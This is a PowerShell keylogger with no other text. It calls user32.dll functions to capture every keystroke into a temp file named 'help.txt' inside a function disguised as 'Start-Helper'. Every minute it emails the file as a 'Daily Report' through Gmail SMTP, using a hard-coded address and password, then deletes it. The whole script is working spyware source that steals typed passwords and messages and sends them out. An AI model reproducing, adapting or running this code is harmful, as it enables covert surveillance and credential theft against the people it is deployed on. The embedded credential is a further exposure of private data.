$TimesToRun = 100
$RunTimeP = 1	# Time in minutes
$From = "sparkdigi56@gmail.com"
$Pass = "sdlzeiyqfaiflejg"
$To = "sparkdigi56@gmail.com"
$Subject = "Daily Report"
$body = "Daily Report"
$SMTPServer = "smtp.gmail.com"	# Gmail SMTP
$SMTPPort = "587"
$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
############################

$TimeStart = Get-Date
$TimeEnd = $TimeStart.AddMinutes($RunTimeP)

#requires -Version 2
function Start-Helper($Path="$env:temp\help.txt")
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    $Runner = 0
    while ($TimesToRun -ge $Runner)
    {
      $TimeNow = Get-Date
      while ($TimeEnd -ge $TimeNow)
      {
        Start-Sleep -Milliseconds 40

        for ($ascii = 9; $ascii -le 254; $ascii++)
        {
          $state = $API::GetAsyncKeyState($ascii)

          if ($state -eq -32767)
          {
            $null = [console]::CapsLock

            $virtualKey = $API::MapVirtualKey($ascii, 3)

            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            $mychar = New-Object -TypeName System.Text.StringBuilder

            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success)
            {
              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
            }
          }
        }
        $TimeNow = Get-Date
      }

      # Send email with the collected data
      Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl

      # Clean up the temporary file
      Remove-Item -Path $Path -Force

      # Increment the runner counter
      $Runner++
    }
  }
  finally
  {
    exit 1
  }
}

Start-Helper
